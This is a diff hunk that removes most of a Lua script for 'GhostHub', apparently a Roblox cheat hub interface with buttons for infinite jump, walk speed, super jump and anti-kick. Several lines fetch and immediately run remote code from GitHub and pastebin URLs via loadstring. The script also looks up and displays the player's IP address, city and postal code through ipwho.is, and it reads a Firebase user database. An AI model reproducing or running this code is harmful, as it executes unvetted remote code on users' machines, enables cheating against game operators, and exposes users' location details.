@@ -1,2818 +1,632 @@
-local GhostGui = Instance.new("ScreenGui")
-local G = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local ButtonsFrame = Instance.new("ScrollingFrame")
-local Exit = Instance.new("TextButton")
-local OpenGui = Instance.new("ImageButton")
-local UICorner = Instance.new("UICorner")
-local UIStroke = Instance.new("UIStroke") 
-local Title = Instance.new("TextLabel")
-local Line = Instance.new("TextLabel")
-local Line1 = Instance.new("TextLabel")
-FrameContent = Instance.new("Frame")
-local Home = Instance.new("TextButton")
-local Main = Instance.new("TextButton")
-local GhostScript = Instance.new("TextButton")
-local Other = Instance.new("TextButton")
-local FrameGameHub = Instance.new("ScrollingFrame")
-local GameHub = Instance.new("TextButton")
-local ScrollingFrameMoreScript = Instance.new("ScrollingFrame")
-local FrameMoreScript = Instance.new("Frame")
-local MoreScriptSearch = Instance.new("TextBox")
-local MoreScript = Instance.new("TextButton")
-local Shout = Instance.new("TextButton")
-local FrameCredits = Instance.new("Frame")
-local Credits = Instance.new("TextButton")
-local Image = Instance.new("ImageButton")
-local Information = Instance.new("TextButton")
-local Credits1 = Instance.new("TextButton")
-local Credits2 = Instance.new("TextButton")
-local Credits3 = Instance.new("TextButton")
-local Credits4 = Instance.new("TextButton")
-local Credits5 = Instance.new("TextButton")
-local FrameShout = Instance.new("Frame")
-
-GhostGui.Parent = game.CoreGui
-
-Frame.Parent = GhostGui
-Frame.BackgroundColor3 = Color3.new(0,0,0)
-Frame.BorderColor3 = Color3.new(1,1,1)
-Frame.BorderSizePixel = 1
-Frame.Position = UDim2.new(0.03,0,0.07)
-Frame.Size = UDim2.new(0.8,0.2,0.8)
-Frame.Active = true
-Frame.Draggable = true
-Frame.Visible = false
-
-Title.Parent = Frame
-Title.BackgroundColor3 = Color3.new(0,0,0)
-Title.BackgroundTransparency = 1
-Title.Position = UDim2.new(0.023,0,0)
-Title.TextColor3 = Color3.new(1,1,1)
-Title.Size = UDim2.new(0.5,0,0.1)
-Title.Font = Enum.Font.Merriweather
-Title.FontSize = Enum.FontSize.Size14
-Title.Text = "Xx GHOSTHUB xX"
-Title.TextXAlignment = Enum.TextXAlignment.Left
-Title.TextScaled = true
-Title.TextSize = 8
-Title.TextWrapped = true
-
-Exit.Parent = Frame
-Exit.BackgroundColor3 = Color3.new(0,0,0)
-Exit.BackgroundTransparency = 0
-Exit.BorderSizePixel = 1
-Exit.BorderColor3 = Color3.new(1,1,1)
-Exit.Position = UDim2.new(0.95,0,0)
-Exit.TextColor3 = Color3.new(1,1,1)
-Exit.Size = UDim2.new(0.05,0,0.1)
-Exit.Font = Enum.Font.Merriweather
-Exit.FontSize = Enum.FontSize.Size14
-Exit.Text = "X"
-Exit.TextScaled = true
-Exit.TextSize = 8
-Exit.TextWrapped = true
-Exit.Draggable = false
-
-Exit.MouseButton1Click:connect(function()
-Frame.Visible = false
-OpenGui.Visible = true
-end)
-
-G.Parent = game.CoreGui
-
-OpenGui.Parent = G
-OpenGui.BackgroundColor3 = Color3.new(0,0,0)
-OpenGui.BackgroundTransparency = 1
-OpenGui.Position = UDim2.new(0.103524067, 0, 0.200333327, 0)
-OpenGui.Image = "rbxassetid://17611933870"
-OpenGui.Size = UDim2.new(0.058,0,0.12)
-OpenGui.Draggable = true
-
-OpenGui.MouseButton1Click:connect(function()
-OpenGui.Visible = false
-Frame.Visible = true
-end)
-
-UICorner.Parent = OpenGui
-UICorner.CornerRadius = UDim.new(0.1,0)
- 
-UIStroke.Parent = OpenGui
-UIStroke.Color = Color3.fromRGB(242,243,243)
-UIStroke.Thickness = 2
-
-Line.Parent = Frame
-Line.BackgroundColor3 = Color3.new(1,1,1)
-Line.BackgroundTransparency = 0
-Line.Position = UDim2.new(0.001,0,0.1)
-Line.TextColor3 = Color3.new(1,1,1)
-Line.Size = UDim2.new(0.9979,0,0.003)
-Line.Font = Enum.Font.SourceSansLight
-Line.FontSize = Enum.FontSize.Size14
-Line.Text = ""
-Line.TextScaled = true
-Line.TextSize = 8
-Line.TextWrapped = true
-
-Line1.Parent = Frame
-Line1.BackgroundColor3 = Color3.new(1,1,1)
-Line1.BackgroundTransparency = 0
-Line1.Position = UDim2.new(0.15,0,0.1065)
-Line1.TextColor3 = Color3.new(1,1,1)
-Line1.Size = UDim2.new(0.001,0,0.891)
-Line1.Font = Enum.Font.SourceSansLight
-Line1.FontSize = Enum.FontSize.Size14
-Line1.Text = ""
-Line1.TextScaled = true
-Line1.TextSize = 8
-Line1.TextWrapped = true
-
-ButtonsFrame.Parent = Frame
-ButtonsFrame.BackgroundColor3 = Color3.new(0,0,0)
-ButtonsFrame.BorderColor3 = Color3.new(1,1,1)
-ButtonsFrame.BorderSizePixel = 0
-ButtonsFrame.Position = UDim2.new(0.001,0,0.109)
-ButtonsFrame.Size = UDim2.new(0.147,0,0.89)
-ButtonsFrame.Active = true
-ButtonsFrame.CanvasSize = UDim2.new(0, 0, 1.05, 0)
-ButtonsFrame.ScrollBarThickness = 0
-ButtonsFrame.Draggable = false
-ButtonsFrame.Visible = true
-
-FrameContent.Parent = Frame
-FrameContent.BackgroundColor3 = Color3.new(0,0,0)
-FrameContent.BorderColor3 = Color3.new(1,1,1)
-FrameContent.BorderSizePixel = 0
-FrameContent.Position = UDim2.new(0.152,0,0.105)
-FrameContent.Size = UDim2.new(0.847,0.2,0.891)
-FrameContent.Active = true
-FrameContent.Draggable = false
-
-Home.Parent = ButtonsFrame
-Home.BackgroundColor3 = Color3.new(0,0,0)
-Home.BackgroundTransparency = 0
-Home.BorderSizePixel = 1
-Home.BorderColor3 = Color3.new(1,1,1)
-Home.Position = UDim2.new(0.05,0,0.01)
-Home.TextColor3 = Color3.new(1,1,1)
-Home.Size = UDim2.new(0.899,0,0.1)
-Home.Font = Enum.Font.Merriweather
-Home.FontSize = Enum.FontSize.Size14
-Home.Text = "Home"
-Home.TextScaled = true
-Home.TextSize = 8 
-Home.TextWrapped = true
-
-Home.MouseButton1Click:connect(function()
-FrameContent.Visible = true
-FrameContent:ClearAllChildren()
-ShowHome()
-ScrollingFrameMoreScript.Visible = false
-FrameGameHub.Visible = false
-FrameCredits.Visible = false
-FrameShout.Visible = false
-end)
-
-Main.Parent = ButtonsFrame
-Main.BackgroundColor3 = Color3.new(0,0,0)
-Main.BackgroundTransparency = 0
-Main.BorderSizePixel = 1
-Main.BorderColor3 = Color3.new(1,1,1)
-Main.Position = UDim2.new(0.05,0,0.13)
-Main.TextColor3 = Color3.new(1,1,1)
-Main.Size = UDim2.new(0.899,0,0.1)
-Main.Font = Enum.Font.Merriweather
-Main.FontSize = Enum.FontSize.Size14
-Main.Text = "Main"
-Main.TextScaled = true
-Main.TextSize = 8 
-Main.TextWrapped = true
-
-Main.MouseButton1Click:connect(function()
-FrameContent.Visible = true
-FrameContent:ClearAllChildren()
-AddMain1()
-ScrollingFrameMoreScript.Visible = false
-FrameGameHub.Visible = false
-FrameCredits.Visible = false
-FrameShout.Visible = false
-end)
-
-GhostScript.Parent = ButtonsFrame
-GhostScript.BackgroundColor3 = Color3.new(0,0,0)
-GhostScript.BackgroundTransparency = 0
-GhostScript.BorderSizePixel = 1
-GhostScript.BorderColor3 = Color3.new(1,1,1)
-GhostScript.Position = UDim2.new(0.05,0,0.25)
-GhostScript.TextColor3 = Color3.new(1,1,1)
-GhostScript.Size = UDim2.new(0.899,0,0.1)
-GhostScript.Font = Enum.Font.Merriweather
-GhostScript.FontSize = Enum.FontSize.Size14
-GhostScript.Text = "GhostScript"
-GhostScript.TextScaled = true
-GhostScript.TextSize = 8 
-GhostScript.TextWrapped = true
-
-GhostScript.MouseButton1Click:connect(function()
-ScrollingFrameMoreScript.Visible = false
-FrameGameHub.Visible = false
-FrameCredits.Visible = false
-FrameContent.Visible = true
-FrameShout.Visible = false
-FrameContent:ClearAllChildren()
-AddGhostScript1()
-end)
-
-Other.Parent = ButtonsFrame
-Other.BackgroundColor3 = Color3.new(0,0,0)
-Other.BackgroundTransparency = 0
-Other.BorderSizePixel = 1
-Other.BorderColor3 = Color3.new(1,1,1)
-Other.Position = UDim2.new(0.05,0,0.37)
-Other.TextColor3 = Color3.new(1,1,1)
-Other.Size = UDim2.new(0.899,0,0.1)
-Other.Font = Enum.Font.Merriweather
-Other.FontSize = Enum.FontSize.Size14
-Other.Text = "Other"
-Other.TextScaled = true
-Other.TextSize = 8 
-Other.TextWrapped = true
-
-Other.MouseButton1Click:connect(function()
-FrameContent.Visible = true
-FrameContent:ClearAllChildren()
-AddOther1()
-ScrollingFrameMoreScript.Visible = false
-FrameGameHub.Visible = false
-FrameCredits.Visible = false
-FrameShout.Visible = false
-end)
-
-FrameGameHub.Parent = Frame
-FrameGameHub.BackgroundColor3 = Color3.new(0,0,0)
-FrameGameHub.BorderColor3 = Color3.new(1,1,1)
-FrameGameHub.BorderSizePixel = 0
-FrameGameHub.Position = UDim2.new(0.152,0,0.105)
-FrameGameHub.Size = UDim2.new(0.847,0.2,0.891)
-FrameGameHub.Active = true
-FrameGameHub.CanvasSize = UDim2.new(0, 0, 2, 0)
-FrameGameHub.ScrollBarThickness = 3
-FrameGameHub.Draggable = false
-FrameGameHub.Visible = false
-
-GameHub.Parent = ButtonsFrame
-GameHub.BackgroundColor3 = Color3.new(0,0,0)
-GameHub.BackgroundTransparency = 0
-GameHub.BorderSizePixel = 1
-GameHub.BorderColor3 = Color3.new(1,1,1)
-GameHub.Position = UDim2.new(0.05,0,0.49)
-GameHub.TextColor3 = Color3.new(1,1,1)
-GameHub.Size = UDim2.new(0.899,0,0.1)
-GameHub.Font = Enum.Font.Merriweather
-GameHub.FontSize = Enum.FontSize.Size14
-GameHub.Text = "GameHub"
-GameHub.TextScaled = true
-GameHub.TextSize = 8 
-GameHub.TextWrapped = true
-
-GameHub.MouseButton1Click:connect(function()
-FrameContent.Visible = false
-ScrollingFrameMoreScript.Visible = false
-FrameGameHub.Visible = true
-FrameCredits.Visible = false
-FrameShout.Visible = false
-end)
-
-ScrollingFrameMoreScript.Parent = Frame
-ScrollingFrameMoreScript.BackgroundColor3 = Color3.new(0,0,0)
-ScrollingFrameMoreScript.BorderColor3 = Color3.new(1,1,1)
-ScrollingFrameMoreScript.BorderSizePixel = 0
-ScrollingFrameMoreScript.Position = UDim2.new(0.152,0,0.105)
-ScrollingFrameMoreScript.Size = UDim2.new(0.847,0,0.89)
-ScrollingFrameMoreScript.Active = true
-ScrollingFrameMoreScript.CanvasSize = UDim2.new(0, 0, 1000, 0)
-ScrollingFrameMoreScript.ScrollBarThickness = 0
-ScrollingFrameMoreScript.Draggable = false
-ScrollingFrameMoreScript.Visible = false
-
-FrameMoreScript.Parent = ScrollingFrameMoreScript
-FrameMoreScript.BackgroundColor3 = Color3.new(1,1,1)
-FrameMoreScript.BorderColor3 = Color3.new(1,1,1)
-FrameMoreScript.BackgroundTransparency = 1
-FrameMoreScript.BorderSizePixel = 0
-FrameMoreScript.Position = UDim2.new(0.03,0,0)
-FrameMoreScript.Size = UDim2.new(0.878,1,1)
-FrameMoreScript.Active = true
-FrameMoreScript.Draggable = false
-
-MoreScriptSearch.Parent = ScrollingFrameMoreScript
-MoreScriptSearch.BackgroundColor3 = Color3.new(0,0,0)
-MoreScriptSearch.BackgroundTransparency = 0
-MoreScriptSearch.Position = UDim2.new(0,0,0)
-MoreScriptSearch.TextColor3 = Color3.new(1,1,1)
-MoreScriptSearch.Size = UDim2.new(0.16,0,0.00005)
-MoreScriptSearch.Font = Enum.Font.Merriweather
-MoreScriptSearch.FontSize = Enum.FontSize.Size14
-MoreScriptSearch.Text = ""
-MoreScriptSearch.ClearTextOnFocus = false
-MoreScriptSearch.PlaceholderText = "Search Script"
-MoreScriptSearch.TextXAlignment = Enum.TextXAlignment.Left
-MoreScriptSearch.TextScaled = false
-MoreScriptSearch.TextSize = 14
-MoreScriptSearch.TextWrapped = true
-
-local MoreScriptSearchTextBox = nil
-MoreScriptSearch.Changed:Connect(function()
-if MoreScriptSearch.Text ~= MoreScriptSearchTextBox then
-   MoreScriptSearchTextBox = MoreScriptSearch.Text
-   FrameMoreScript:ClearAllChildren()
-   GetMoreScript()
-end
-end)
-
-MoreScriptSearch:GetPropertyChangedSignal("Text"):Connect(function()
-GetMoreScript()
-end)
-
-MoreScript.Parent = ButtonsFrame
-MoreScript.BackgroundColor3 = Color3.new(0,0,0)
-MoreScript.BackgroundTransparency = 0
-MoreScript.BorderSizePixel = 1
-MoreScript.BorderColor3 = Color3.new(1,1,1)
-MoreScript.Position = UDim2.new(0.05,0,0.61)
-MoreScript.TextColor3 = Color3.new(1,1,1)
-MoreScript.Size = UDim2.new(0.899,0,0.1)
-MoreScript.Font = Enum.Font.Merriweather
-MoreScript.FontSize = Enum.FontSize.Size14
-MoreScript.Text = "MoreScript"
-MoreScript.TextScaled = true
-MoreScript.TextSize = 8 
-MoreScript.TextWrapped = true
-
-MoreScript.MouseButton1Click:connect(function()
-ScrollingFrameMoreScript.Visible = true
-FrameContent.Visible = false
-FrameGameHub.Visible = false
-FrameCredits.Visible = false
-FrameShout.Visible = false
-end)
-
-FrameCredits.Parent = Frame
-FrameCredits.BackgroundColor3 = Color3.new(0,0,0)
-FrameCredits.BorderColor3 = Color3.new(1,1,1)
-FrameCredits.BorderSizePixel = 0
-FrameCredits.Position = UDim2.new(0.152,0,0.105)
-FrameCredits.Size = UDim2.new(0.847,0.2,0.891)
-FrameCredits.Active = true
-FrameCredits.Draggable = false
-FrameCredits.Visible = false
-
-Credits.Parent = ButtonsFrame
-Credits.BackgroundColor3 = Color3.new(0,0,0)
-Credits.BackgroundTransparency = 0
-Credits.BorderSizePixel = 1
-Credits.BorderColor3 = Color3.new(1,1,1)
-Credits.Position = UDim2.new(0.05,0,0.73)
-Credits.TextColor3 = Color3.new(1,1,1)
-Credits.Size = UDim2.new(0.899,0,0.1)
-Credits.Font = Enum.Font.Merriweather
-Credits.FontSize = Enum.FontSize.Size14
-Credits.Text = "Information"
-Credits.TextScaled = true
-Credits.TextSize = 8 
-Credits.TextWrapped = true
-
-Credits.MouseButton1Click:connect(function()
-FrameContent.Visible = false
-FrameCredits.Visible = true
-FrameGameHub.Visible = false
-ScrollingFrameMoreScript.Visible = false
-FrameShout.Visible = false
-end)
-
-FrameShout.Parent = Frame
-FrameShout.BackgroundColor3 = Color3.new(0,0,0)
-FrameShout.BorderColor3 = Color3.new(1,1,1)
-FrameShout.BorderSizePixel = 0
-FrameShout.Position = UDim2.new(0.152,0,0.105)
-FrameShout.Size = UDim2.new(0.847,0.2,0.891)
-FrameShout.Active = true
-FrameShout.Draggable = false
-FrameShout.Visible = false
-
-Shout.Parent = ButtonsFrame
-Shout.BackgroundColor3 = Color3.new(0,0,0)
-Shout.BackgroundTransparency = 0
-Shout.BorderSizePixel = 1
-Shout.BorderColor3 = Color3.new(1,1,1)
-Shout.Position = UDim2.new(0.05,0,0.85)
-Shout.TextColor3 = Color3.new(1,1,1)
-Shout.Size = UDim2.new(0.899,0,0.1)
-Shout.Font = Enum.Font.Merriweather
-Shout.FontSize = Enum.FontSize.Size14
-Shout.Text = "Shout"
-Shout.TextScaled = true
-Shout.TextSize = 8 
-Shout.TextWrapped = true
-
-Shout.MouseButton1Click:connect(function()
-FrameShout.Visible = true
-FrameContent.Visible = false
-FrameCredits.Visible = false
-FrameGameHub.Visible = false
-ScrollingFrameMoreScript.Visible = false
-end)
-
-
----Admin Detector in Server
-loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/main/Admin'))()
----
-
----Bad Words Detector
---local Result = DetectBadWords("Message Here") --Use This to Detect if message has a inappropriate words
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Detect BadWords"))()
----
-
---[[ Encode Decode Function
-EncodeSymbol("A","ASCII") --use this method to Encode Letter, this results is = "65 "
-DecodeSymbol("65","ASCII") --use this method to Decode Letter, this results is = "A"
-Encode("Hi","ASCII") --use this method to Encode Message, this results is = "72 105"
-Decode("72 105 ","ASCII") --use this method to Decode Message, this results is = "Hi"
-]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Encode%20Source"))()
----
-
----Request Ask Dialog Function
---RequestAskDialog("Script", "Are you sure do you want to Remove This?", "Cancel", "Remove", "script1 here", "script2 here") --use this method to request askdialog
-loadstring(game:HttpGet('https://pastebin.com/raw/xZPR6bXa'))()
----
-
-
----Request Message Notification Function
-function RequestMessage(title,msg1,msg2)
- local MessageGui = Instance.new("ScreenGui")
- local Frame = Instance.new("Frame")
- local Title = Instance.new("TextLabel")
- local Message1 = Instance.new("TextLabel")
- local Message2 = Instance.new("TextLabel")
- 
- MessageGui.Parent = game.CoreGui
-
- Frame.Parent = MessageGui
- Frame.BackgroundColor3 = Color3.new(0,0,0)
- Frame.BorderColor3 = Color3.new(1,1,1)
- Frame.Position = UDim2.new(1,0,0.7)
- Frame.BorderSizePixel = 1
- Frame.Size = UDim2.new(0.2,0.2,0.25)
- Frame.Active = true
- Frame.Draggable = false
-
- Title.Parent = Frame
- Title.BackgroundColor3 = Color3.new(1,1,1)
- Title.BackgroundTransparency = 1
- Title.Position = UDim2.new(0.01,0,0.01)
- Title.TextColor3 = Color3.new(1,1,1)
- Title.Size = UDim2.new(0.980,0,0.2)
- Title.Font = Enum.Font.SourceSansLight
- Title.Text = ""
- Title.FontSize = Enum.FontSize.Size14
- Title.TextScaled = true
- Title.TextSize = 8
- Title.TextWrapped = true
-
- Message1.Parent = Frame
- Message1.BackgroundColor3 = Color3.new(1,1,1)
- Message1.BackgroundTransparency = 1
- Message1.Position = UDim2.new(0.01,0,0.35)
- Message1.TextColor3 = Color3.new(1,1,1)
- Message1.Size = UDim2.new(0.980,0,0.2)
- Message1.Font = Enum.Font.SourceSansLight
- Message1.FontSize = Enum.FontSize.Size14
- Message1.Text = ""
- Message1.TextScaled = true
- Message1.TextSize = 8
- Message1.TextWrapped = true
-
- Message2.Parent = Frame
- Message2.BackgroundColor3 = Color3.new(1,1,1)
- Message2.BackgroundTransparency = 1
- Message2.Position = UDim2.new(0.01,0,0.55)
- Message2.TextColor3 = Color3.new(1,1,1)
- Message2.Size = UDim2.new(0.980,0,0.2)
- Message2.Font = Enum.Font.SourceSansLight
- Message2.FontSize = Enum.FontSize.Size14
- Message2.Text = ""
- Message2.TextScaled = true
- Message2.TextSize = 8
- Message2.TextWrapped = true
- wait()
- Frame.Position = UDim2.new(0.99,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.96,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.93,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.88,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.85,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.82,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.79,0,0.7)
- wait()
- Frame.Position = UDim2.new(0.78,0,0.7)
-
-
- ----Filtering
- if title then
-    Title.Text = title
- end
- if msg1 then
-    Message1.Text = msg1
- end
- if msg2 then
-    Message2.Text = msg2
- end
-
-
- ----For Destroy Frame
- wait(2)
- Frame.Transparency = 0.1
- wait()
- Frame.Transparency = 0.2
- wait()
- Frame.Transparency = 0.3
- wait()
- Frame.Transparency = 0.4
- wait()
- Frame.Transparency = 0.5
- wait()
- Frame.Transparency = 0.6
- wait()
- Frame.Transparency = 0.7
- wait()
- Frame.Transparency = 0.8
- wait()
- Frame.Transparency = 0.9
- wait()
- Frame.Transparency = 1
- wait()
- MessageGui:Destroy()
-end
----
-
-
-
-
-
-
----Show Home Function
-local ProfileImage, IsReady = game.Players:GetUserThumbnailAsync(game.Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-local IP = game.HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
-local IPAdress = IP.ip
-local Continent = IP.continent
-local Country = IP.country
-local Flag = IP.flag.emoji
-local Region = IP.region
-local Capital = IP.capital
-local City = IP.city
-local Postal = IP.postal
-
-
----For Get Ghosthub Users in database
-local UsersURL = "https://ghosthub-users-bc222-default-rtdb.firebaseio.com/"
-local UsersTable = nil
----
-
-
-function ShowHome()
- local ScrollingFrameHome = Instance.new("ScrollingFrame")
- ScrollingFrameHome.Parent = FrameContent
- ScrollingFrameHome.BackgroundColor3 = Color3.new(0,0,0)
- ScrollingFrameHome.BorderColor3 = Color3.new(1,1,1)
- ScrollingFrameHome.BorderSizePixel = 0
- ScrollingFrameHome.Position = UDim2.new(0,0,0)
- ScrollingFrameHome.Size = UDim2.new(1,0,1)
- ScrollingFrameHome.Active = true
- ScrollingFrameHome.CanvasSize = UDim2.new(0, 0, 2, 0)
- ScrollingFrameHome.ScrollBarThickness = 0
-
- local Profile = Instance.new("ImageButton")
- Profile.Parent = ScrollingFrameHome
- Profile.BackgroundColor3 = Color3.new(0,0,0)
- Profile.BackgroundTransparency = 0
- Profile.Size = UDim2.new(0.3,0,0.3)
- Profile.BorderColor3 = Color3.new(1,1,1)
- Profile.BorderSizePixel = 1
- Profile.Position = UDim2.new(0.03,0,0.03)
- Profile.Image = ProfileImage
- 
- local NameTextLabel = Instance.new("TextLabel")
- NameTextLabel.Parent = ScrollingFrameHome
- NameTextLabel.BackgroundColor3 = Color3.new(0,0,0)
- NameTextLabel.BorderColor3 = Color3.new(1,1,1)
- NameTextLabel.BorderSizePixel = 1
- NameTextLabel.BackgroundTransparency = 1
- NameTextLabel.Position = UDim2.new(0.058,0,0.235)
- NameTextLabel.TextColor3 = Color3.new(1,1,1)
- NameTextLabel.Size = UDim2.new(0.25,0,0.35)
- NameTextLabel.Font = Enum.Font.Merriweather
- NameTextLabel.FontSize = Enum.FontSize.Size14
- NameTextLabel.Text = "Welcome \
-"..game.Players.LocalPlayer.Name
- NameTextLabel.TextScaled = true
- NameTextLabel.TextSize = 18
- NameTextLabel.TextWrapped = true
- 
- local AccountInfo = Instance.new("TextLabel")
- AccountInfo.Parent = ScrollingFrameHome
- AccountInfo.BackgroundColor3 = Color3.new(0,0,0)
- AccountInfo.BackgroundTransparency = 1
- AccountInfo.Position = UDim2.new(0.4,0,0.03)
- AccountInfo.TextColor3 = Color3.new(1,1,1)
- AccountInfo.Size = UDim2.new(0.5,0,0.425)
- AccountInfo.Font = Enum.Font.Legacy
- AccountInfo.FontSize = Enum.FontSize.Size14
- AccountInfo.Text = "Username: "..game.Players.LocalPlayer.Name.."\
-User ID: "..game.Players.LocalPlayer.UserId.."\
-AccountAge: "..game.Players.LocalPlayer.AccountAge.."\
-IP Address: "..IPAdress.."\
-Continent: "..Continent.."\
-Country Flag: "..Flag.."\
-Country: "..Country.."\
-Region: "..Region.."\
-Capital: "..Capital.."\
-City: "..City.."\
-Postal: "..Postal
- AccountInfo.TextScaled = false
- AccountInfo.TextSize = 10
- AccountInfo.TextWrapped = true
- AccountInfo.TextXAlignment = Enum.TextXAlignment.Left
- AccountInfo.TextYAlignment = Enum.TextYAlignment.Top
- 
- ---Clicks Leaderboard
- local ClicksFrame = Instance.new("Frame")
- ClicksFrame.Parent = ScrollingFrameHome
- ClicksFrame.BackgroundColor3 = Color3.new(0,0,0)
- ClicksFrame.BorderColor3 = Color3.new(1,1,1)
- ClicksFrame.BorderSizePixel = 1
- ClicksFrame.Position = UDim2.new(0.03,0,0.54)
- ClicksFrame.Size = UDim2.new(0.6,0,0.43)
- ClicksFrame.Active = true
- ClicksFrame.Draggable = false
- 
- local Rank = NameTextLabel:Clone()
- Rank.Parent = ClicksFrame
- Rank.BackgroundTransparency = 0
- Rank.Position = UDim2.new(0,0,0)
- Rank.Size = UDim2.new(0.1,0,0.1)
- Rank.Text = "Rank"
- Rank.TextScaled = false
- Rank.TextSize = 13
- 
- local Country = Rank:Clone()
- Country.Parent = ClicksFrame
- Country.Position = UDim2.new(0.1,0,0)
- Country.Size = UDim2.new(0.7,0,0.1)
- Country.Text = "Country"
- 
- local Clicks = Rank:Clone()
- Clicks.Parent = ClicksFrame
- Clicks.Position = UDim2.new(0.7,0,0)
- Clicks.Size = UDim2.new(0.3,0,0.1)
- Clicks.Text = "Clicks"
- 
- local LeaderboardScrolling = Instance.new("ScrollingFrame")
- LeaderboardScrolling.Parent = ClicksFrame
- LeaderboardScrolling.BackgroundColor3 = Color3.new(0,0,0)
- LeaderboardScrolling.BackgroundTransparency = 1
- LeaderboardScrolling.Position = UDim2.new(0,0,0.1)
- LeaderboardScrolling.Size = UDim2.new(1,0,0.9)
- LeaderboardScrolling.CanvasSize = UDim2.new(0, 0, 50, 0)
- LeaderboardScrolling.ScrollBarThickness = 0
- 
- local NationButtonPosZ = 0.0001
- local function AddNationUsers(rank, country, clicks)
-  local Rank = NameTextLabel:Clone()
-  Rank.Parent = LeaderboardScrolling
-  Rank.BackgroundTransparency = 0
-  Rank.Position = UDim2.new(0,0,NationButtonPosZ)
-  Rank.Size = UDim2.new(0.1,0,0.0025)
-  Rank.Font = Enum.Font.SourceSansBold
-  Rank.Text = rank
-  Rank.TextScaled = false
-  Rank.TextSize = 13
- 
-  local Country = Rank:Clone()
-  Country.Parent = LeaderboardScrolling
-  Country.Position = UDim2.new(0.1,0,NationButtonPosZ)
-  Country.Size = UDim2.new(0.7,0,0.0025)
-  Country.TextXAlignment = Enum.TextXAlignment.Left
-  Country.Font = Enum.Font.Merriweather
-  Country.Text = " "..country
- 
-  local Clicks = Rank:Clone()
-  Clicks.Parent = LeaderboardScrolling
-  Clicks.Position = UDim2.new(0.7,0,NationButtonPosZ)
-  Clicks.Size = UDim2.new(0.3,0,0.0025)
-  Clicks.Font = Enum.Font.SourceSansBold
-  Clicks.Text = clicks
-  
-  NationButtonPosZ += 0.00256
- end
- 
- if UsersTable == nil then --Get data in Ghosthub Users database
-    local UsersDatabase, IsActive = pcall(function()
-    UsersTable = game.HttpService:JSONDecode(game:HttpGet(UsersURL..".json")) --get database to detect the database is active
-    end)
- end
- 
- if UsersTable ~= nil then
-    local TotalClicks = NameTextLabel:Clone()
-    TotalClicks.Parent = ScrollingFrameHome
-    TotalClicks.Position = UDim2.new(0.65,0,0.6)
-    TotalClicks.Size = UDim2.new(0.3,0,0.07)
-    TotalClicks.TextYAlignment = Enum.TextYAlignment.Top
-    TotalClicks.Text = "Total Clicks Starts From December 9 2024"
-    TotalClicks.TextSize = 12
-    TotalClicks.TextScaled = false
-    
-    local ClicksCount = TotalClicks:Clone()
-    ClicksCount.Parent = ScrollingFrameHome
-    ClicksCount.Position = UDim2.new(0.65,0,0.68)
-    ClicksCount.Font = Enum.Font.SourceSansBold
-    ClicksCount.Text = "0"
-    ClicksCount.TextScaled = true
-    
-    ---Get Total Clicks
-    local clicksnum = 0
-    for key, value in pairs(UsersTable) do
-      if key then
-        clicksnum += value.Clicks
-      end
-    end
-    ClicksCount.Text = clicksnum
-    ---
-    
-    local function SetCostLeaderboard(TABLE, KEY)
-     local TableList = {}
-     local TableLength = 0
-     for key, value in pairs(TABLE) do
-       if key and value[KEY] ~= nil then
-         TableLength += 1
-         TableList[key] = {
-           [KEY] = value[KEY]
-          }
-       end
-     end
- 
-     local ListCount = TableLength
-     local CurrentHigh2 = 0
-     local HighPlr = nil
-     local rank = 0
-     repeat
-       local CurrentHigh = 0
-       for key, value in pairs(TableList) do
-         if value[KEY] >= CurrentHigh2 and value[KEY] >= CurrentHigh or value[KEY] >= CurrentHigh and value[KEY] <= CurrentHigh2 then
-           CurrentHigh = value[KEY]
-           HighPlr = key
-         end
-       end
-       TableList[HighPlr] = nil
-       CurrentHigh2 = CurrentHigh
-       rank += 1
-       AddNationUsers(rank, " "..UsersTable[HighPlr].Flag.." "..HighPlr, CurrentHigh2)
-       ListCount -= 1
-     until ListCount == 0
-    end
-    SetCostLeaderboard(UsersTable, "Clicks")
- end
- ---
-end
----
-ShowHome() --for starter content
-
-
-
-
----Add PageButton Function
-function AddPageButton(name,script)
- local PageButton = Instance.new("TextButton")
- PageButton.Parent = FrameContent
- PageButton.BackgroundColor3 = Color3.new(0,0,0)
- PageButton.BackgroundTransparency = 0
- PageButton.BorderSizePixel = 1
- PageButton.BorderColor3 = Color3.new(1,1,1)
- PageButton.Position = UDim2.new(0.95,0,0.9)
- PageButton.TextColor3 = Color3.new(1,1,1)
- PageButton.Size = UDim2.new(0.05,0,0.1)
- PageButton.Font = Enum.Font.Merriweather
- PageButton.FontSize = Enum.FontSize.Size14
- PageButton.Text = name
- PageButton.TextScaled = true
- PageButton.TextSize = 8 
- PageButton.TextWrapped = true
-
- PageButton.MouseButton1Click:connect(function()
- loadstring(script)()
- end)
-end
----
-
-
-
----Add Button Function
-function AddButton(name, posX, posZ, script)
- local Button = Instance.new("TextButton")
- Button.Parent = FrameContent
- Button.BackgroundColor3 = Color3.new(0,0,0)
- Button.BackgroundTransparency = 0
- Button.BorderSizePixel = 1
- Button.BorderColor3 = Color3.new(1,1,1)
- Button.Position = UDim2.new(posX,0,posZ)
- Button.TextColor3 = Color3.new(1,1,1)
- Button.Size = UDim2.new(0.13,0,0.15)
- Button.Font = Enum.Font.Merriweather
- Button.FontSize = Enum.FontSize.Size14
- Button.Text = name
- Button.TextScaled = false
- Button.TextSize = 12
- Button.TextWrapped = true
-
- Button.MouseButton1Click:Connect(function()
- loadstring(script)()
- end)
-end
----
-
-
-
-
---Add Main Buttons Function
-function AddMain1()
- AddButton("Infinite Jump","0.03","0.09","Main1()")
- AddButton("Walk Speed","0.18","0.09","Main2()")
- AddButton("Super Jump","0.33","0.09","Main3()")
- AddButton("Rejoin","0.48","0.09","Main4()")
- AddButton("Anti Afk","0.63","0.09","Main5()")
- AddButton("Anti Lag","0.78","0.09","Main6()")
- AddButton("Anti Kick","0.03","0.29","Main7()")
